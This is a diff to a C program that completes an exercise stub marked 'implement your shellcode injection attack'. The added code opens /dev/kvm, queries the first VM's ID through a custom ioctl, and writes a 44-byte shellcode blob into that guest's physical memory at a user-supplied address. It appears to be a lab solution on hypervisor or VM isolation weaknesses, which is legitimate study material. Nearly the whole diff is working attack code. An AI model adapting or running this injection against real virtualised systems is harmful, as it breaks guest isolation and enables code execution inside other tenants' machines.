@@ -1,4 +1,9 @@
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <linux/kvm.h>
+
 #include <stdint.h>
+#include <stdio.h>
 
 struct kvm_arm_write_gpa_args {
 	uint32_t vmid;
@@ -6,6 +11,9 @@ struct kvm_arm_write_gpa_args {
 	uint64_t buf;
 	uint64_t size;
 };
+
+#define KVM_ARM_WRITE_GPA _IOW(KVMIO, 0x0b, struct kvm_arm_write_gpa_args)
+#define KVM_ARM_GET_VMID _IOW(KVMIO, 0x0c, unsigned long)
 
 extern void shellcode();
 __asm__(".global shellcode\n"
@@ -30,8 +38,37 @@ int main(int argc, char *argv[])
 {
 	struct kvm_arm_write_gpa_args wgpa = {
 		.buf = (unsigned long)&shellcode,
+		.size = 44,
 	};
-	// TODO: implement your shellcode injection attack
+	int ret;
+
+	if (argc < 2) {
+		printf("Usage: %s gpa\n", argv[0]);
+		return 1;
+	}
+	sscanf(argv[1], "%lx", &wgpa.gpa);
+
+	// O_NONBLOCK to avoid unwanted side effects
+	int kvm = open("/dev/kvm", O_RDWR | O_NONBLOCK);
+	if (kvm < 0) {
+		perror("open kvm fail");
+		return kvm;
+	}
+
+	// get VMID of the first VM
+	ret = ioctl(kvm, KVM_ARM_GET_VMID, 0);
+	if (ret < 0) {
+		perror("get VMID fail");
+		return ret;
+	}
+	printf("first VMID is %d\n", ret);
+	wgpa.vmid = ret;
+
+	// write to VM memory
+	printf("&args = %p, vmid = %d, gpa = %lx, size = %ld\n",
+	       &wgpa, wgpa.vmid, wgpa.gpa, wgpa.size);
+	ret = ioctl(kvm, KVM_ARM_WRITE_GPA, &wgpa);
+	if (ret < 0)
+		perror("write gPA fail");
+	printf("kvm returns %d\n", ret);
 }
-
-
